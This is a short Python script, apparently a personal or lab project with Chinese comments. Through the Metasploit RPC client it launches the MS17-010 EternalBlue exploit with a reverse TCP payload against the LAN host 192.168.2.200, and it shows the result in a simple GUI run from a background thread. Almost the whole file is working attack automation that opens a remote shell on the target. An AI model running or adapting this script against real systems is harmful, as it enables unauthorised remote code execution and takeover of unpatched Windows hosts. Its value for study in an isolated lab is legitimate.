import threading

from pymetasploit3.msfrpc import MsfRpcClient

from libs.Attack import Attack
from libs.GUI_Template import GUI_Template
from libs.Modules import Modules
from libs.Payloads import Payloads


class GUI(GUI_Template):
    def input_event(self, text):
        print(f'輸入: {text}')

    def global_key_event(self, event):
        print(f'按鍵: {event}')


def attack_thread(gui):
    """
    異步攻擊線程

    :param gui:
    :type gui: (GUI)
    :return:
    """
    # 建立客戶端
    client = MsfRpcClient("salt", port=55553, ssl=True)

    # 建立攻擊
    atk = Attack(client, '192.168.2.200', Modules.MS17_010_ETERNALBLUE, Payloads.REVERSE_TCP)

    # 開始攻擊
    gui.print(atk.run())


if __name__ == "__main__":
    # 初始化介面
    gui = GUI('My Console')

    # 異步線程執行攻擊
    t1 = threading.Thread(target=attack_thread, args=(gui,))
    t1.start()

    # 建立介面
    gui.build()

    # 等待攻擊線程完成
    t1.join()
